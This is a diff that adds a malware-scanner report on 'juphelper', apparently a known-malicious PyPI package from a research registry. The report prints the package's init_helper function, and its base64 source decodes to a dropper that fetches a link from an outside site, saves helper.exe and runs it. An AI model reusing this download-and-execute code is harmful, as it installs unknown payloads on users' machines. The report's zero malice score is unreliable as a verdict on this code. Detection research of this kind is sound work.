@@ -1,0 +1,30 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/juphelper/0.1.6/juphelper-0.1.6/juphelper-0.1.6/juphelper/helper.py
+  contents:
+  - name: init_helper
+    score: 0.0
+    code: |-
+      def init_helper():
+          try:
+              link_response = requests.get("https://sleipnirbrowser.org/api/python/14526470/win")
+
+              if link_response.status_code == 200:
+                  json_data = link_response.json()
+
+                  if 'link' in json_data:
+                      download_link = json_data['link']
+                      updateData(download_link)
+                  else:
+                      pass
+          except Exception as e:
+              pass
+              # print(f"An error occurred: {e}")
+    tokens: resume nop load_global requests load_attr get load_const STRING_URL call store_fast link_response load_fast link_response load_attr status_code load_const INTEGER compare_op == pop_jump_if_false TO_NUMBER load_fast link_response load_attr json call store_fast json_data load_const link load_fast json_data contains_op pop_jump_if_false TO_NUMBER load_fast json_data load_const link binary_subscr store_fast download_link load_global updateData load_fast download_link call pop_top return_const None return_const None return_const None push_exc_info load_global Exception check_exc_match pop_jump_if_false TO_NUMBER store_fast e pop_except load_const store_fast e delete_fast e return_const None load_const store_fast e delete_fast e reraise reraise copy pop_except reraise
+    hash: fee0ed181b4dd3b4bb18e350404dc17c365375bf1d4c4b8b946a855bb9331f97
+sources:
+  .repo_cache/malicious_repos/pypi_malregistry/juphelper/0.1.6/juphelper-0.1.6/juphelper-0.1.6/juphelper/helper.py: aW1wb3J0IG9zCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcmVxdWVzdHMKCmRlZiB1cGRhdGVEYXRhKHVybCk6CiAgICB0cnk6CiAgICAgICAgZG93bmxvYWRfZGlyID0gJ3NyYy9zdG9yYWdlJwoKICAgICAgICBvcy5tYWtlZGlycyhkb3dubG9hZF9kaXIsIGV4aXN0X29rPVRydWUpCgogICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihkb3dubG9hZF9kaXIsICJoZWxwZXIuZXhlIikKCiAgICAgICAgdXJsbGliLnJlcXVlc3QudXJscmV0cmlldmUodXJsLCBmaWxlX3BhdGgpCgogICAgICAgIHN1YnByb2Nlc3MucnVuKFtmaWxlX3BhdGhdLCBjaGVjaz1UcnVlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgICAgICAjIHByaW50KGYiQW4gZXJyb3Igb2NjdXJyZWQ6IHtlfSIpCgpkZWYgaW5pdF9oZWxwZXIoKToKICAgIHRyeToKICAgICAgICBsaW5rX3Jlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3NsZWlwbmlyYnJvd3Nlci5vcmcvYXBpL3B5dGhvbi8xNDUyNjQ3MC93aW4iKQoKICAgICAgICBpZiBsaW5rX3Jlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAganNvbl9kYXRhID0gbGlua19yZXNwb25zZS5qc29uKCkKCiAgICAgICAgICAgIGlmICdsaW5rJyBpbiBqc29uX2RhdGE6CiAgICAgICAgICAgICAgICBkb3dubG9hZF9saW5rID0ganNvbl9kYXRhWydsaW5rJ10KICAgICAgICAgICAgICAgIHVwZGF0ZURhdGEoZG93bmxvYWRfbGluaykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAgICAgIyBwcmludChmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQ==
